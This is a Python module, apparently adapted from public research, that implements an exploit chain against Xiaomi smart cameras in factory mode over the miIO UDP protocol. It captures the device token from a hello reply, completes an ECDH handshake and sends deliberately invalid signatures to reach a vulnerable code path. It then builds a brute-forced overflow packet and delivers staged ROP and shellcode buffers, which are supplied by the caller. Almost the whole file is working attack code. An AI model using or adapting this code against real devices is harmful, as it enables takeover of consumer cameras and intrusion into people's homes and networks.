#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Xiaomi miIO UDP protocol helpers (factory-state handshake + AES framing).

Adapted from public research on Xiaomi Smart Camera factory-mode exploitation.
"""

from __future__ import annotations

import hashlib
import json
import socket
import struct
import time
from base64 import b64decode, b64encode
from typing import Any, Dict, Optional

from cryptography.hazmat.primitives import hashes, hmac, padding, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF

MIIO_DEFAULT_PORT = 54321

HELLO_PKT = (
    b"\x21\x31\x00\x20"
    + b"\xff\xff\xff\xff\xff\xff\xff\xff"
    + b"\x00\x00\x00\x00"
    + b"\xff" * 16
)


def _p32_be(value: int) -> bytes:
    return struct.pack(">I", int(value) & 0xFFFFFFFF)


def _p16_be(value: int) -> bytes:
    return struct.pack(">H", int(value) & 0xFFFF)


def _u32_be(data: bytes) -> int:
    return struct.unpack(">I", data)[0]


def _md5(data: bytes) -> bytes:
    return hashlib.md5(data).digest()


def _pad_pkcs7(data: bytes, block_bits: int = 128) -> bytes:
    padder = padding.PKCS7(block_bits).padder()
    return padder.update(data) + padder.finalize()


def _unpad_pkcs7(data: bytes, block_bits: int = 128) -> bytes:
    unpadder = padding.PKCS7(block_bits).unpadder()
    return unpadder.update(data) + unpadder.finalize()


def aes_encrypt_nopad(pt: bytes, key: bytes, iv: bytes) -> bytes:
    cipher = Cipher(algorithms.AES128(key), modes.CBC(iv)).encryptor()
    return cipher.update(pt) + cipher.finalize()


def aes_encrypt(pt: bytes, key: bytes, iv: bytes) -> bytes:
    return aes_encrypt_nopad(_pad_pkcs7(pt), key, iv)


def aes_decrypt(ct: bytes, key: bytes, iv: bytes) -> bytes:
    cipher = Cipher(algorithms.AES128(key), modes.CBC(iv)).decryptor()
    return _unpad_pkcs7(cipher.update(ct) + cipher.finalize())


def expand_shared_secret(shared_secret: bytes, token: bytes) -> bytes:
    hkdf = HKDF(
        algorithm=hashes.SHA256(),
        length=0x20,
        salt=token.hex().encode(),
        info=None,
    )
    return hkdf.derive(shared_secret)[:0x10]


def miio_sign(data: bytes, key: bytes) -> bytes:
    signer = hmac.HMAC(key, hashes.SHA256())
    signer.update(data)
    return signer.finalize()


class MiioUdpClient:
    """UDP client for miIO factory-mode handshake and encrypted commands."""

    def __init__(
        self,
        host: str,
        port: int = MIIO_DEFAULT_PORT,
        recv_timeout: float = 0.1,
    ) -> None:
        self.host = str(host).strip()
        self.port = int(port)
        self.recv_timeout = float(recv_timeout)
        self.sock: Optional[socket.socket] = None
        self.global_did: bytes = b""
        self.server_start_time: float = 0.0
        self.token: bytes = b""

    def close(self) -> None:
        if self.sock is not None:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None

    def _open_socket(self) -> socket.socket:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(self.recv_timeout)
        return sock

    def _recv(self) -> bytes:
        if self.sock is None:
            return b""
        try:
            return self.sock.recv(65535)
        except (TimeoutError, socket.timeout, OSError):
            return b""

    def send_raw(self, packet: bytes) -> bytes:
        if self.sock is None:
            self.sock = self._open_socket()
        self.sock.sendto(packet, (self.host, self.port))
        return self._recv()

    def assemble_raw(self, payload: bytes, sent_len: Optional[int] = None) -> bytes:
        pkt = bytearray()
        pkt += b"\x21\x31\x00\x20"
        pkt += self.global_did
        pkt += _p32_be(max(0, int(time.time()) - int(self.server_start_time)))
        pkt += self.token
        pkt += payload
        if sent_len is None:
            sent_len = len(pkt)
        pkt[2:4] = _p16_be(sent_len)
        pkt[16:32] = _md5(pkt[:sent_len])
        return bytes(pkt)

    def _session_key_iv(self) -> tuple[bytes, bytes]:
        key = _md5(self.token)
        iv = _md5(key + self.token)
        return key, iv

    def assemble_encrypted_nopad(self, payload: bytes) -> bytes:
        key, iv = self._session_key_iv()
        return self.assemble_raw(aes_encrypt_nopad(payload, key, iv))

    def assemble_encrypted(self, payload: bytes) -> bytes:
        key, iv = self._session_key_iv()
        return self.assemble_raw(aes_encrypt(payload, key, iv))

    def assemble_overflow(self, payload: bytes, overflow_tail: bytes) -> bytes:
        assert len(payload) % 16 == 0
        key, iv = self._session_key_iv()
        cipher = Cipher(algorithms.AES128(key), modes.CBC(iv)).encryptor()
        ct = cipher.update(payload) + cipher.finalize()
        ct2 = b""
        for counter in range(2**32):
            pt = struct.pack("<I", counter) + overflow_tail
            ecb = Cipher(algorithms.AES128(key), modes.ECB()).encryptor()
            ct2 = ecb.update(pt) + ecb.finalize()
            if ct2[-1] == 0:
                break
        return self.assemble_raw(ct + ct2, len(ct) + 16 + 15)

    def decrypt(self, packet: bytes) -> bytes:
        key, iv = self._session_key_iv()
        return aes_decrypt(packet[0x20:], key, iv)

    def send_encrypted(self, payload: bytes) -> bytes:
        return self.send_raw(self.assemble_encrypted(payload))

    def send_encrypted_nopad(self, payload: bytes) -> bytes:
        return self.send_raw(self.assemble_encrypted_nopad(payload))

    def send_hello(self, max_attempts: int = 200) -> bool:
        """Exchange the initial 0x20-byte hello and capture device id + token."""
        self.close()
        hello = b""
        attempts = 0
        while len(hello) != 0x20 and attempts < max_attempts:
            attempts += 1
            try:
                self.sock = self._open_socket()
                self.sock.sendto(HELLO_PKT, (self.host, self.port))
                hello = self._recv()
            except OSError:
                hello = b""
        if len(hello) != 0x20:
            return False

        self.global_did = hello[4:12]
        server_stamp = _u32_be(hello[12:16])
        server_stamp_time = time.time()
        self.server_start_time = round(server_stamp_time) - server_stamp
        self.token = hello[16:32]
        return len(self.token) == 16

    def perform_factory_handshake(self) -> bool:
        """
        Run miIO.handshake (ECDH + OOB) and send miIO.config_router_safe with
        invalid signatures to reach the vulnerable code path.
        """
        if len(self.token) != 16:
            return False

        self.send_encrypted(b'{"id":1,"method":"miIO.handshake","params":{"type":1}}')
        self._recv()

        priv = ec.generate_private_key(ec.SECP256R1())
        pub = priv.public_key()
        pub_bytes = pub.public_bytes(
            encoding=serialization.Encoding.X962,
            format=serialization.PublicFormat.UncompressedPoint,
        )

        self.send_encrypted(
            json.dumps(
                {
                    "id": 1,
                    "method": "miIO.handshake",
                    "params": {
                        "type": 2,
                        "ecdh": {
                            "mode": 0,
                            "curve_suite": 3,
                            "sign_suite": 1,
                            "public_key": b64encode(pub_bytes).decode(),
                        },
                    },
                }
            ).encode()
        )
        reply = self._recv()
        if not reply:
            return False
        data = json.loads(self.decrypt(reply).decode())
        peer_public_key = ec.EllipticCurvePublicKey.from_encoded_point(
            ec.SECP256R1(),
            b64decode(data["result"]["ecdh"]["public_key"]),
        )
        ext_info_ct = b64decode(data["result"]["ecdh"]["extent"])
        shared_secret = priv.exchange(ec.ECDH(), peer_public_key)
        hmac_key = expand_shared_secret(shared_secret, self.token)
        ext_info = json.loads(aes_decrypt(ext_info_ct, hmac_key, b"\0" * 16))
        peer_ext_public_key = ec.EllipticCurvePublicKey.from_encoded_point(
            ec.SECP256R1(),
            b64decode(ext_info["public_key"]),
        )

        self.send_encrypted(
            json.dumps(
                {
                    "id": 1,
                    "method": "miIO.handshake",
                    "params": {"type": 3, "oob": {"mode": 2, "step": 1}},
                }
            ).encode()
        )
        reply = self._recv()
        if not reply:
            return False
        data = json.loads(self.decrypt(reply).decode())
        pinsign = b64decode(data["result"]["oob"]["sign"])

        self.send_encrypted(
            json.dumps(
                {
                    "id": 1,
                    "method": "miIO.handshake",
                    "params": {
                        "type": 3,
                        "oob": {"step": 2, "sign": b64encode(pinsign).decode()},
                    },
                }
            ).encode()
        )
        reply = self._recv()
        if not reply:
            return False
        data = json.loads(self.decrypt(reply).decode())
        remote_random = b64decode(data["result"]["oob"]["random"])

        self.send_encrypted(
            json.dumps(
                {
                    "id": 1,
                    "method": "miIO.handshake",
                    "params": {
                        "type": 3,
                        "oob": {
                            "step": 3,
                            "random": b64encode(remote_random).decode(),
                        },
                    },
                }
            ).encode()
        )
        reply = self._recv()
        if not reply:
            return False
        data = json.loads(self.decrypt(reply).decode())
        handshake_iv = b64decode(data["result"]["oob"]["iv"])

        ext_shared_secret = priv.exchange(ec.ECDH(), peer_ext_public_key)
        ext_key = expand_shared_secret(ext_shared_secret, self.token)
        data_blob = b"foobarxxxxxxxxxx"
        data_ct = aes_encrypt(data_blob, hmac_key, handshake_iv)
        edata_ct = aes_encrypt(b"", ext_key, handshake_iv)
        self.send_encrypted(
            json.dumps(
                {
                    "id": 1,
                    "method": "miIO.config_router_safe",
                    "params": {
                        "data": b64encode(data_ct).decode(),
                        "sign": "foo",
                        "extents": {
                            "public_key": b64encode(pub_bytes).decode(),
                            "data": b64encode(edata_ct).decode(),
                            "sign": "foo",
                        },
                    },
                }
            ).encode()
        )
        self._recv()
        return True

    def send_overflow_trigger(
        self,
        overflow_tail: bytes,
        chunk_size: int = 0x30,
    ) -> None:
        chunk = b"\xff" * chunk_size
        self.send_raw(self.assemble_overflow(chunk, overflow_tail))

    def send_stage1_chain(self, payload: bytes) -> None:
        self.send_encrypted(b"x")
        self.send_encrypted_nopad(payload)
        self.send_encrypted(b"x")

    def trigger_stage2(self, payload2: bytes) -> bool:
        """Re-hello and deliver the second-stage ROP + shellcode buffer."""
        self.send_raw(HELLO_PKT)
        reply = self._recv()
        if not reply:
            return False
        trigger = b'{"id":1,"method":"miIO.info"}\0' + payload2
        self.send_encrypted(trigger)
        return True


def probe_miio_udp(
    host: str,
    port: int = MIIO_DEFAULT_PORT,
    timeout: float = 2.0,
) -> Dict[str, Any]:
    """Best-effort miIO UDP probe (factory hello)."""
    result: Dict[str, Any] = {
        "host": host,
        "port": int(port),
        "open": False,
        "miio": False,
        "token": "",
        "error": "",
    }
    if not host:
        result["error"] = "host not set"
        return result

    client = MiioUdpClient(host, port, recv_timeout=timeout)
    try:
        if client.send_hello(max_attempts=5):
            result["open"] = True
            result["miio"] = len(client.token) == 16
            result["token"] = client.token.decode("latin-1", errors="replace")
    except OSError as exc:
        result["error"] = str(exc)
    finally:
        client.close()
    return result
